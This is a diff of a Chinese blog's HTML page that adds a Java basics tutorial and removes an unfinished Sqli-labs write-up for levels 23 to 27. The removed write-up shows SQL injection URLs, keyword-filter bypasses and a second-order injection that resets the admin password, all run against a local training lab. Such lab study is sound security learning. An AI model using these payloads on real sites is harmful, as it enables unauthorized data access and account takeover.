+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/08/Java语法基础/" itemprop="url">基础知识 | JAVA语法基础<一></a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-08T08:15:41+08:00">
+                2019-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>终于忙完考试了,计划接下来的2周时间除了完成课设外,打算补下Java,读2本推理小说,接着更新博客。</p>
+</blockquote>
+<hr>
+<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>Java是一种面向对象程序设计语言,所有的数据类型都是用类描述的,Java程序也是由若干个类组成的,想学好Java,类是必须要掌握的。</p>
+<h3 id="类知识"><a href="#类知识" class="headerlink" title="类知识"></a>类知识</h3><h4 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h4><p>Java中的类分为类声明与类主体    </p>
+<h5 id="类声明"><a href="#类声明" class="headerlink" title="类声明"></a>类声明</h5><pre><code>格式:`修饰符 class 类名 extends 父类名 implements 接口名`        
+修饰符:可选,分为定义类的性质(abstract,final)和访问权限(public和默认等)    
+extends:可选,继承父类,如无指定,默认继承Java.lang.Object,只支持单继承
+implements:可选,用于指明该类实现的接口,允许一个类实现多个接口(,分割)。    
+</code></pre><h5 id="类主体"><a href="#类主体" class="headerlink" title="类主体"></a>类主体</h5><p>包括成员变量与成员方法的定义与实现    </p>
+<h5 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h5><p>格式:<code>变量修饰符 变量类型 变量名</code><br>变量类型为Java语言中任意的数据类型或引用数据类型(类,数组等),成员变量通过其变量修饰符来确定访问权限。</p>
+<h5 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h5><p>格式:<code>方法修饰符 返回类型 方法名(参数列表)</code><br>方法修饰符:public,private,protected,final,static,abstract,synchronized。前三种说明访问权限,public(所有类都可以访问),private(只能被本类访问),protected(允许被相同包的类访问),final(修饰最终方法,被修饰过的方法不允许被子类重载),static(修饰类方法,可直接通过类名调用且不允许重载),abstract(修饰抽象方法,只有方法声明,无方法体),synchronized(修饰用于线程同步)。<br>返回类型:可以是基本数据类型或者自定义类,如不需要返回值,设置其为void即可。<br>方法名与参数列表:符合命名规范即可<br>方法体:定义功能,方法体内可定义局部变量,作用域仅在方法体内。</p>
+<h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><p>当用new一个新对象时,构造方法立即执行,构造方法名必须与类名相同。    </p>
+<pre><code>public 类名(参数列表){}
+</code></pre><p>定义构造方法注意:<br>    1.无返回类型(包括void),修饰符只能为public,private,protected中的任一个<br>    2.不能从父类继承<br>    3.系统默认提供无参构造方法<br>    4.构造方法不能通过方法名直接调用,只能通过new运算符调用。<br>    5.构造方法可以调用当前类(this)或父类的构造方法(super),<code>必须在第一行调用</code>。</p>
+<h4 id="类使用"><a href="#类使用" class="headerlink" title="类使用"></a>类使用</h4><h5 id="类声明-创建"><a href="#类声明-创建" class="headerlink" title="类声明,创建"></a>类声明,创建</h5><p>类是对象模板,只有实例化后才可使用。<br><code>Circle c1</code> //声明<br><code>Circle c1 = new Circle()</code> //new用于创建一个对象的实例并返回对象的引用。<br><code>c1.a(1,2)</code> //调用成员方法a(),参数为1,2    </p>
+<h5 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h5><p>对象不再使用后,Java系统通过垃圾回收器GC,周期性地释放内存,回收工作由Java系统自动完成,减少程序员的工作量。    </p>
+<h4 id="this的使用"><a href="#this的使用" class="headerlink" title="this的使用"></a>this的使用</h4><p>关键字this表示实例对象指向自己的引用,可出现再实例方法与构造方法中,不能出现在由static修饰的类方法(静态方法)。    </p>
+<h5 id="实例方法和构造方法中使用this"><a href="#实例方法和构造方法中使用this" class="headerlink" title="实例方法和构造方法中使用this"></a>实例方法和构造方法中使用this</h5><p>this(color),this.h=h,this.cry() //调用本实例类的构造方法,成员变量与成员方法。</p>
+<h5 id="区分成员变量与局部变量"><a href="#区分成员变量与局部变量" class="headerlink" title="区分成员变量与局部变量"></a>区分成员变量与局部变量</h5><p>成员变量在整个类中都有效,局部变量仅在方法体内有效。<code>在方法体内声明的变量与方法传入的参数称为局部变量。</code>如果在实例方法中的局部变量名字与成员变量名字相同,这个成员变量在这个方法内就会暂时失效(强龙压不过地头蛇),如果确实想引用成员变量,使用this关键字即可。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.30.00-image.png" alt="2019-01-08.11.30.00-image.png"></p>
+<h5 id="返回实例对象本身的引用"><a href="#返回实例对象本身的引用" class="headerlink" title="返回实例对象本身的引用"></a>返回实例对象本身的引用</h5><p>this还可以作为成员方法的return语句的参数,用来返回对象本身的引用。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.35.39-image.png" alt="2019-01-08.11.35.39-image.png"><br>返回长大后的Dog类。    </p>
+<h5 id="使用this调用类的其他构造方法"><a href="#使用this调用类的其他构造方法" class="headerlink" title="使用this调用类的其他构造方法"></a>使用this调用类的其他构造方法</h5><p>使用this调用其他类的构造方法(this(a)),至于系统具体会调用哪个方法,根据参数的类型与个数决定。    </p>
+<h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p>OOP是Java的重点,OOP的三个特性</p>
+<pre><code>封装:用一个类将实现与使用分开,只保留接口与外部进行联系
+继承:字类自动继承其父类的属性与方法,并且可以添加新的属性与方法
+多态:虽然多个子类都有一个共同的方法,但是子类实例化后都可以获得完全不同的结果
+</code></pre><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><pre><code>面向对象程序设计的一个特性就是封装,将实体特征的属性隐藏起来,对象与外界仅通过公共方法进行交流,提高程序的可靠性,安全性与可维护性。数据的隐藏与开放对外的接口可通过访问权限控制符实现,Java提供了public,protected,private和默认4种访问控制符
+public
+    可被同一个或不同包的任何类访问通常只将公共类或公共接口的成员方法组指定为public
+protected
+    可用来修饰类的成员变量与方法,可被本类、本包的其他类访问,也可被其他包的字类继承
+默认
+    用户没有指定,就会自动使用默认权限,只能被本类或其他一个包中的其他类、接口、成员方法引用,也被称为包权限
+pricate
+    声明类的私有成员,被private修饰的成员变量和方法只能被该类自身所访问或修改,而不能被其他类(包括该类的子类)来获取或引用    
+getInfo和setInfo    
+    为了系统设计的安全性考虑,一般将类的成员变量定义为private形式,而将类的成员方法定义为public对外公开。类中提供变量对应的get方法(得到private成员变量)和set方法(修改private成员变量),达到其他类可以操作该类的private成员变量
+</code></pre><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><pre><code>研究生是一类特殊的学生,研究生类在保留学生类的基本属性和行为的基础上,可以增加新的属性与行为,也可以修改学生的属性和行为。这里学生就是研究生的父类(或超类),研究生为学生的子类。父类派生子类,子类继承父类,子类也可以派生其他类,这样就构成了类的层次结构。继承机制可提高系统的可扩展性与可维护性。
+</code></pre><h5 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h5><pre><code>class Graduate extends Student{    
+使用extends关键字实现类的继承,如果类定义没有使用extends关键字,则默认该类的父类为java.lang.Object,Object类是Java预定义的所有类的父类，包含所有的Java使用的公共属性其中定义的属性与方法均可被任何类使用 继承或修改。Java只能继承一个父类(单继承),子类继承父类的变量和方法,可以增加父类没有的变量或方法,也可以修改已有的变量或方法。
+用Eclipse打开Java文件,连按两次Ctrl+o,可得到当前类与父类的属性,方法:    
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2019-01-07.19.45.34-image.png" alt="2019-01-07.19.45.34-image.png"><br>    <code>子类可以继承父类的成员属性与方法,但受访问权限的限制。如父类与子类在不同的包中定义,子类只能public与protected权限的变量,如果父类与子类在一个包中定义,子类能访问父类的public,protected与默认权限的变量,如果要访问private类型的变量,只能使用其父类的set与get方法访问。</code></p>
+<h5 id="super的使用"><a href="#super的使用" class="headerlink" title="super的使用"></a>super的使用</h5><p>子类在继承父类的属性与方法时,可能会出现变量隐藏(变量的名相同,类型不要求)或方法覆盖(子类与父类的方法名,返回类型,入口参数的数目,类型,顺序相同,只是实现的功能不同)。此时父类的变量与方法就会被覆盖,如需要调用父类被隐藏的属性与方法,可通过<code>super</code>关键字调用<br>eg:</p>
+<pre><code>public class Student{
+  public static void main(String[] args) {
+      AClass aClass = new AClass();
+      BClass bClass = new BClass();
+
+      aClass.p1();
+      bClass.p1();
+      }
+}
+public class AClass {
+    int a;
+    float a1;
+
+    public AClass() {
+        a = 50;
+        a1 = 99.99f;
+    }
+    public void p1() {
+        System.out.println(&quot;method A&quot;);
+        System.out.println(&quot;a=&quot;+a);
+        }
+}
+public class BClass extends AClass{
+    int a;    //与父类的成员变量名相同,属于变量隐藏
+    public BClass() {
+      a = 10;
+      a1 = 123.6f;
+  }
+    public void p1() {    //与父类的成员方法相同,属于方法覆盖现象
+      System.out.println(&quot;method b&quot;);
+      System.out.println(&quot;a=&quot;+a);    //这里的a是bClass的变量a
+      super.p1();     //通过super调用被覆盖的父类成员方法
+      System.out.println(&quot;super.a=&quot;+super.a);    //通过super访问被隐藏的父类成员变量
+  }
+}
+</code></pre><p>   运行结果:</p>
+<pre><code>   method A
+a=50
+method b
+a=10
+method A
+a=50
+super.a=50
+</code></pre><p><code>super</code>除上述的2种作用,还可显示调用父类构造方法。<br>    实例方法与构造方法的super关键字都指向父类,实例方法中的super关键字是去调用父类中的某个方法,而构造方法中使用是去调用父类的构造方法。</p>
+<h5 id="子类对象的构造"><a href="#子类对象的构造" class="headerlink" title="子类对象的构造"></a>子类对象的构造</h5><p>当子类创建时,系统默认自动(显式或隐式)调用父类的无参构造方法。需要注意的是,如果父类定义了有参数的构造方法,系统就不会再提供默认的无参构造方法,此时子类一定要避免使用父类的无参构造方法。<br>调用构造方法时,遵循的规则:<br>    1.创建对象时,调用该类的父类构造方法(将第一条写为super语句即可),super可以调用父类的任何一个带参数或不带参数的构造方法。<br>    2.如果类的构造方法中第一条语句没有使用super,则编译器也会默认用super()调用父类的无参构造方法。<br>    3.用this()调用本类的构造方法。<br>    4.如父类定义了有参构造方法,子类的构造方法一定要super显式调用父类的有参构造方法。<br>所以说,在定义一个类时,如果没有特殊需求,尽量在类中定义一个无参的构造方法,防止被继承时出现错误。</p>
+<h5 id="对象类型转换"><a href="#对象类型转换" class="headerlink" title="对象类型转换"></a>对象类型转换</h5><pre><code>如同数据类型的转换,对象也可以在一定范围内进行转换,由于子类具有父类的方法与属性,因此子类对象可以向上转化为父类对象(上转型对象)
+ SuperClass spc = new SubClass(); //SubClass是SuperClass的子类,父类引用指向对象实例
+SubClass sbc = new SuperClass(); //错误 因为父类不一定含有子类的属性与方法
+</code></pre><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><pre><code>方法重载与方法覆盖是是实现继承的基本手段。重载只是方法的名字相同,而参数(参数类型,参数个数),方法覆盖是指子类的方法名与父类的方法名完全相同(参数类型,个数,返回值类型),即在子类重写了父类的方法,这样就能使用相同的方法名实现不同的功能。
+
+class Animal{
+    public void enjoy(){
+
+    }
+}
+class Cat extends Animal{
+    public void enjoy(){
+        System.out.println(&quot;Cat....&quot;);
+    }
+}
+class Dog extends Animal{
+    public void enjoy(){
+        System.out.println(&quot;Dog....&quot;);
+    }
+}
+public class Testpolymoph{
+
+  public static void main(String[] args){
+      Testpolymoph test = new Testpolymoph();
+      Cat cat = new Cat();
+      Dog dog = new Dog();
+      test.myEnjoy(cat);
+      test.myEnjoy(dog);
+  }
+
+  public void myEnjoy(Animal pet){
+      pet.enjoy();
+  }
+
+}
+</code></pre><p>运行结果:</p>
+<pre><code>用一个enjoy()方法就实现了不同的对象所需的操作,即不修改程序代码就可以改变程序运行时所绑定的具体代码,让程序可以选择多个运行状态,这就是实现了多态型。(像是定义一个方法,传入的参数是不同的对象,然后执行不同对象相应的相同名的成员方法)
+</code></pre><h3 id="非访问控制符"><a href="#非访问控制符" class="headerlink" title="非访问控制符"></a>非访问控制符</h3><pre><code>类定义的时候除了可以使用public,private,protected和默认来设置成员变量与成员方法的访问权限,还可以使用static,final,abstract来说明其特性。 
+</code></pre><h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><h5 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h5><pre><code>被static修饰的成员变量或成员方法称为类变量(静态变量)和类方法(静态方法)。没有被static修饰的称为实例变量和实例方法。
+实例变量依附于对象,不同实例变量占用不同的内存空间。类变量依附于类,占用公共空间,该类的每个实例对象共享同一变量的存储空间,每个对象对类变量的修改都会影响其他实例对象。
+public class Student{
+    public static void main(String[] args) {
+      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
+      AClass aClass1 = new AClass();
+      AClass aClass2 = new AClass();
+      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
+      System.out.println(&quot;现在的人数:&quot;+aClass2.personnum);
+    }
+}
+public class AClass {
+  static int personnum = 100;
+
+  public AClass() {
+      personnum ++;
+  }
+}
+</code></pre><p>输出结果:<br>    现在的人数:100<br>    现在的人数:102<br>    现在的人数:102<br>每次创建AClass的实例时,调用其构造方法使其personnum加1,因此personnum可以记录所产生的实例对象的个数。可通过类名(AClass.personnum)实例对象名(aClass2.personnum)访问变量。且每个对象对静态变量personnum的修改都会影响其他实例对象。</p>
+<h5 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h5><pre><code>类方法的本质是该方法属于整个类,而不是某个实例,可以不创建实例,直接通过类名调用(AClass.add(1,1))。
+
+类方法的特点：
+    1.可直接调用,不需要创建实例对象,例如,Java Application的入口main()方法被声明为static类方法,不需要创建任何实例对象即可调用。
+    2.类方法属于整个类,被调用时可能还没有创建任何实例对象实例,因此,类方法只能访问类变量,而不能直接访问实例变量或实例方法。
+    3.类方法中不能使用this关键字,因为静态方法不属于任何一个实例。
+</code></pre><p>eg:</p>
+<pre><code>public class Student{
+    public static void main(String[] args) {
+        System.out.println(&quot;sum&quot;+AClass.sum(3, 1));
+        //System.out.println(&quot;sub&quot;+AClass.sub(3,1));  会报错,不能直接调用实例方法
+    }
+}
+public class AClass {
+  //static int personnum = 100;
+  int z = 3;
+
+  public static int sum(int a,int b) {
+      //return z; 会报错,因为类方法中只能使用类变量,不能使用实例变量。
+      return a+b;
+  }
+
+  public int sub(int a,int b) {
+      return a-b;
+  }
+
+}
+</code></pre><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><pre><code>final可以修饰类,成员变量,成员方法,被final修饰过类,变量,方法的均不允许继承或覆盖。
+</code></pre><h5 id="final修饰类"><a href="#final修饰类" class="headerlink" title="final修饰类"></a>final修饰类</h5><pre><code>被final修饰过的类称为最终类,它不可能有子类。
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.09.58.52-image.png" alt="2019-01-08.09.58.52-image.png"></p>
+<h5 id="final修饰方法"><a href="#final修饰方法" class="headerlink" title="final修饰方法"></a>final修饰方法</h5><blockquote>
+<p>使用final方法的原因有两个。第一个原因是把方法锁定，以防任何继承类修改它的含义；第二个原因是效率。在早期的Java实现版本中，会将final方法转为内嵌调用。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升。在最近的Java版本中，不需要使用final方法进行这些优化了    </p>
+</blockquote>
+<p>因此,只有在想明确禁止该方法在子类中被覆盖的情况下才将方法设置为final。    </p>
+<h5 id="final修饰变量"><a href="#final修饰变量" class="headerlink" title="final修饰变量"></a>final修饰变量</h5><h6 id="final修饰普通变量"><a href="#final修饰普通变量" class="headerlink" title="final修饰普通变量"></a>final修饰普通变量</h6><pre><code>被final修饰的变量称为常量,不允许修改
+final int a = 3;a = 2;  //编译器会报错
+</code></pre><h5 id="final修饰引用变量"><a href="#final修饰引用变量" class="headerlink" title="final修饰引用变量"></a>final修饰引用变量</h5><pre><code>当使用final修饰引用类型变量时，它仅仅保证他的地址不变，即一直引用同一个对象，但这个对象完全可以发生改变
+</code></pre><h4 id="其他修饰符"><a href="#其他修饰符" class="headerlink" title="其他修饰符"></a>其他修饰符</h4><h5 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h5><pre><code>主要用于多线程程序的协调和同步,如果某个方法被该关键字修饰,意味着不管哪个县城运行到这个方法时,都要检查有没有线程正在用这个方法,若有,则要等到正在使用的线程结束后,再运行此线程,如无,则直接运行。
+</code></pre><h3 id="抽象类与接口"><a href="#抽象类与接口" class="headerlink" title="抽象类与接口"></a>抽象类与接口</h3><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>先了解以下抽象方法，抽象方法是一种特殊的方法:他只有声明,而没有具体的实现,由它的子类去实现。同时抽象类提供了继承的概念,它的出发点是为了继承,否则它也没有存在的意义<br>抽象方法的声明格式:<code>abstract void fun();</code>如果一个类含有抽象方法,则称这个类为抽象类。<br>定义:如果一个类中没有包含足够的信息来描述具体的对象,<br>格式:<code>abstract class 类名 extends 父类 implements 接口名</code><br>eg:</p>
+<pre><code>public abstract class Animal {
+    public abstract void cry();
+}
+
+public class Cat extends Animal{
+
+    @Override
+    public void cry() {
+        System.out.println(&quot;喵喵&quot;);
+    }
+}
+
+public class Dog extends Animal{
+
+    @Override
+    public void cry() {
+        System.out.println(&quot;汪汪&quot;);
+    }
+
+}
+
+public class Test {
+
+    public static void main(String[] args) {
+        Animal a1 = new Cat();
+        Animal a2 = new Dog();
+
+        a1.cry();
+        a2.cry();
+    }
+</code></pre><p>结果:<br>    喵喵喵<br>    汪汪汪<br>代码定义了一个抽象类Animal,必须提供抽象方法cry(),猫,狗都是动物的子类,由于cry为抽象方法,所以Cat,Dog必须实现cry</p>
+<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>接口在Java中是一个抽象集合,是抽象方法的集合。用来建立类与类之间的协议,它所提供的仅仅是一种协议,没有具体的实现,实现该接口的实现类必须实现该接口的所有方法,通过使用implements,表示遵循某个特定的接口。<br>接口是抽象类的延伸,一个类可以实现多个接口,弥补了类不能多继承的缺陷,一般抽象类与接口配合使用,既可以保证数据安全性又可以实现多继承。<br>注意:接口的所有方法的访问权限被系统自动定义为public,实现接口的非抽象类必须实现该接口的所有方法    </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/09/java_Servlet基础/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2042,942 +3662,6 @@ iconv(
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/30/Sqli-labs Less23-28/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/30/Sqli-labs Less23-28/" itemprop="url">Sqli-labs Less23-28</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-30T08:15:42+08:00">
-                2018-10-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><pre><code>http://127.0.0.1:86/less-23/index.php?id=1&apos;  报错
-http://127.0.0.1:86/less-23/index.php?id=1&apos;%23    报错
-http://127.0.0.1:86/less-23/index.php?id=1&apos;--+ 报错
-http://127.0.0.1:86/less-23/index.php?id=1&apos;&apos; 正确
-</code></pre><p>猜想是后台过滤了这2种注释字符,但是我们可以用<code>&#39;1&#39;=&#39;1</code>闭合后面的<code>&#39;</code>。</p>
-<p>这里可利用联合注入,报错注入,延时注入,我们以联合注入为例:</p>
-<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,2,3 and &apos;1&apos;=&apos;1        
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.16.43-image.png" alt="2018-10-30.09.16.43-image.png"></p>
-<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,database(),3 and &apos;1&apos;=&apos;1
-</code></pre><p>然后将<code>database()</code>处更换为其他查询语句即可。<br>less-23过滤id的代码:</p>
-<pre><code>$reg = &quot;/#/&quot;;
-$reg1 = &quot;/--/&quot;;
-$replace = &quot;&quot;;
-$id = preg_replace($reg, $replace, $id);
-$id = preg_replace($reg1, $replace, $id);
-</code></pre><h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>这一关是关于二次注入的,二次注入也称为存储型的注入,就是将可能导致sql注入的字符先存储到数据库中,当再次调用这个恶意构造的字符时,就会触发sql注入。</p>
-<p>这个例子大致过程:注册一个含有恶意字符(构造sql语句)的用户名(<code>admin&#39;#</code>)—-&gt;存储到数据库中——&gt;修改密码时,调用恶意字符导致修改了用户admin的密码<br>n注册账户admin’#  密码:123456<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.55.00-image.png" alt="2018-10-30.09.55.00-image.png"></p>
-<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.58.25-image.png" alt="2018-10-30.09.58.25-image.png"></p>
-<p>登陆后跳转到更改密码的页面,我们更改密码为test:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.01-image.png" alt="2018-10-30.09.59.01-image.png"></p>
-<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.57-image.png" alt="2018-10-30.09.59.57-image.png"></p>
-<p>我们发现我们刚才注册的账号<code>admin&#39;#</code>的密码并未改变,却改变了admin的密码<br>查看源码:</p>
-<pre><code>$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
-$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
-$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);
-
-if($pass==$re_pass)
-{    
-    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
-</code></pre><p>看代码我们就能理解了,刚才咱们提交修改<code>admin&#39;#</code>后,执行的sql语句是:</p>
-<pre><code>UPDATE users SET PASSWORD=&apos;test&apos; where username=&apos;admin&apos;#&apos; and password=&apos;123456&apos;
-</code></pre><p> 因为#注释掉了后面的内容,所以只执行了前面的语句,将admin的密码修改为test</p>
-<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p> 访问less-25的地址:<br> <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.53.14-image.png" alt="2018-10-30.10.53.14-image.png"></p>
-<p> 大概意思就是:and or被过滤,然后下面写出了过滤后的字符串。面对关键字被过滤的情况,我们可利用:</p>
-<pre><code>1.大小写绕过    AND AnD ANd And aNd aND anD Or oR OR等  
-2.双写绕过        anandd oorr
-3.编码绕过        hex urlencode
-4.特殊字符        an%00d o%00r
-5.利用符号绕过   and=&amp;&amp; or=||
-6.内联注释绕过  /*!and*/
-</code></pre><p>大小写不可以</p>
-<p>双写可以绕过:</p>
-<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; anandd &apos;1&apos;=&apos;1    
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.54.56-image.png" alt="2018-10-30.10.54.56-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.09.50-image.png" alt="2018-10-30.12.09.50-image.png"></p>
-<p>编码绕过:(绕不过)</p>
-<pre><code>%25%36%31%25%36%45%25%36%34
-http://127.0.0.1:86/less-25/index.php?id=1&apos; %25%36%31%25%36%45%25%36%34 &apos;1&apos;=&apos;1    
-</code></pre><p>插入%00绕过</p>
-<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; an%00d &apos;1&apos;=&apos;1
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.03.45-image.png" alt="2018-10-30.12.03.45-image.png"></p>
-<p>注:在数据库中 插入<code>/**/</code>也可绕过,但是在实际利用不可以  原因不详。。。。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.13.01-image.png" alt="2018-10-30.12.13.01-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.14.22-image.png" alt="2018-10-30.12.14.22-image.png"></p>
-<p>利用符号绕过:（&amp;&amp;会被url当成参数分隔符 <code>||</code>可利用）<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.06.47-image.png" alt="2018-10-30.12.06.47-image.png"></p>
-<p>我们这里使用双写绕过方法进行演示,注入的方法可以为联合,报错与延时,这里以联合注入为例:</p>
-<pre><code>#显示报错位:
-http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,2,3 anandd &apos;1&apos;=&apos;1 
-
-#得到数据库名
-http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,database(),3 anandd &apos;1&apos;=&apos;1 
-</code></pre><p>接下来注入即可。</p>
-<p>less-25过滤<code>id</code>的代码:</p>
-<pre><code>function blacklist($id)
-{
-    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
-    $id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
-
-    return $id;
-}
-</code></pre><h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>与less-25类似,只是sql语句是直接拼接<code>$id</code>且关闭了报错,所以把闭合符号<code>&#39;</code>去掉用联合或者延时注入即可。</p>
-<hr>
-<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>过滤函数:</p>
-<pre><code>function blacklist($id)
-{
-    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
-    $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
-    $id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
-    $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --
-    $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #
-    $id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces
-    $id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes
-    return $id;
-}
-</code></pre><p>过滤掉了<code>or and /* -- # 所有空白字符 \</code>等字符<br>对于or与and被过滤的处理方法,见less-25,对于注释符的过滤,见less-23,对于空格,可用下方的字符代替:</p>
-<pre><code>/**/   注释符   被过滤
-%09    TAB键（水平）
-%0a    新建一行
-%0b    TAB键（垂直）
-%0c    新的一页
-%0d    return功能
-%a0    空格
-</code></pre><p>可在<code>linux</code>下尝试是否能成功,这里没搭建,先占个坑</p>
-<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>相比于less-26,闭合符换为了<code>&#39;)</code>且关闭了报错,使用联合或延时注入即可。</p>
-<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>查看源代码：</p>
-<pre><code>function blacklist($id)
-{
-$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
-$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.
-$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.
-$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
